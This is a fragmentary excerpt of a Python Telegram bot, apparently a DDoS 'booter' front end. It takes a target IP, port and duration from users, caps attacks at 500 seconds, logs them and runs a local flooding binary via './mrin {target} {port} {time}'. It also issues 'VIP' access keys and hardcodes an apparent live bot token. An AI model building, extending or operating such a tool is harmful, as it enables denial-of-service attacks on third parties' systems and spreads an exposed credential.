...
bot = telebot.TeleBot('7994851432:AAHO5eAkHUmm4BFjgsyuT1O0VMBga3FqNO8')
...
def create_random_key(length=10):
    ...
    custom_key = f"SANJU-VIP-{random_key.upper()}"
    return custom_key
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 SANJU 𝗯𝗼𝘁!", reply_markup=markup)

COOLDOWN_PERIOD = 1 * 60  # 1 minutes
...
def process_attack_details(message):
    ...
    if len(details) == 3:
        ...
        try:
            ...
            time = int(details[2])
            if time > 500:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 500 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                # Record and log the attack
                record_command_logs(user_id, 'attack', target, port, time)
                log_command(user_id, target, port, time)
                full_command = f"./mrin {target} {port} {time}"
